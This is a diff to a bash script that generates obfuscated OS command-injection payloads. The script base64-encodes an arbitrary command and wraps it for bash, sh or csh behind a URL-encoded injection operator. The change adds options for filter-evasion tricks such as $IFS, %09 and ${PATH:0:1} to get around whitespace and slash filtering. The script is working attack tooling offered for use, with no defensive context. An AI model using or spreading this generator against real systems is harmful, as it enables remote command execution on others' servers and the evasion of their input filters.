@@ -11,7 +11,9 @@ create_bash_payload() {
     local encoded_command=$1
     local encoded_operator=$2
     local filter=$3
-    echo "tmp\$IFS${filter}${encoded_operator}b\"a\"sh<<<\$(base64%09-d<<<$encoded_command)"
+    local whitespace_bypass=$4
+    local slash_bypass=$5
+    echo "tmp${whitespace_bypass}${filter}${encoded_operator}b\"a\"sh<<<\$(base64${slash_bypass}-d<<<$encoded_command)"
 }
 
 # Function to create payload for sh
@@ -19,7 +21,9 @@ create_sh_payload() {
     local encoded_command=$1
     local encoded_operator=$2
     local filter=$3
-    echo "tmp\$IFS${filter}${encoded_operator}sh -c \"\$(echo $encoded_command | base64 -d)\""
+    local whitespace_bypass=$4
+    local slash_bypass=$5
+    echo "tmp${whitespace_bypass}${filter}${encoded_operator}sh -c \"\$(echo $encoded_command | base64${slash_bypass}-d)\""
 }
 
 # Function to create payload for csh
@@ -27,7 +31,9 @@ create_csh_payload() {
     local encoded_command=$1
     local encoded_operator=$2
     local filter=$3
-    echo "tmp\$IFS${filter}${encoded_operator}csh -c \"\$(echo $encoded_command | base64 -d)\""
+    local whitespace_bypass=$4
+    local slash_bypass=$5
+    echo "tmp${whitespace_bypass}${filter}${encoded_operator}csh -c \"\$(echo $encoded_command | base64${slash_bypass}-d)\""
 }
 
 # Check if the correct number of arguments are provided
@@ -58,6 +64,12 @@ encoded_operator=$(printf "%s" "$operator" | jq -sRr @uri)
 # Prompt the user for the filter (if any)
 read -p "Enter any filter to use (e.g., %0a) or press Enter to skip: " filter
 
+# Prompt the user for the whitespace bypass method
+read -p "Enter the method to bypass white spaces (e.g., \$IFS, %09): " whitespace_bypass
+
+# Prompt the user for the slash bypass method
+read -p "Enter the method to bypass slashes (e.g., \${PATH:0:1}, //, %09): " slash_bypass
+
 # Check if base64 utility is available
 if ! command -v base64 &> /dev/null; then
     echo "Error: base64 utility not found. Please install base64."
@@ -67,16 +79,16 @@ fi
 # Encode the command in base64
 encoded_command=$(echo -n "$1" | base64)
 
-# Generate the final payload based on the environment, operator, and filter
+# Generate the final payload based on the environment, operator, filter, and bypass methods
 case $environment in
     bash)
-        payload=$(create_bash_payload "$encoded_command" "$encoded_operator" "$filter")
+        payload=$(create_bash_payload "$encoded_command" "$encoded_operator" "$filter" "$whitespace_bypass" "$slash_bypass")
         ;;
     sh)
-        payload=$(create_sh_payload "$encoded_command" "$encoded_operator" "$filter")
+        payload=$(create_sh_payload "$encoded_command" "$encoded_operator" "$filter" "$whitespace_bypass" "$slash_bypass")
         ;;
     csh)
-        payload=$(create_csh_payload "$encoded_command" "$encoded_operator" "$filter")
+        payload=$(create_csh_payload "$encoded_command" "$encoded_operator" "$filter" "$whitespace_bypass" "$slash_bypass")
         ;;
 esac
 
